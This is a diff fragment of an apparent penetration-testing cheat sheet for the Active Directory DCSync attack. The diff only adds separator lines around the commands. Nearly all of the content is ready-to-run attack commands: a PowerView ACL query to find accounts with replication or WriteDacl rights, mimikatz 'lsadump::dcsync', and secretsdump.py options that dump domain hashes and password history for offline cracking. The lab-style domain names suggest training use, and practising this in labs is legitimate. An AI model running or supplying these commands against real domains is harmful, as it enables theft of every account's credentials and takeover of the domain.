@@ -2,12 +2,16 @@
 #Check user with powerview
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
 
+-------------------------------------------------------------------------------------------------------------------------------
 
 mimikatz.exe
 lsadump::dcsync /user:domain\user
 
+-------------------------------------------------------------------------------------------------------------------------------
 
 secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
 [-just-dc-user <USERNAME>] #To get only of that user
 [-pwd-last-set] #To see when each account's password was last changed
 [-history] #To dump password history, may be helpful for offline password cracking
+
+-------------------------------------------------------------------------------------------------------------------------------
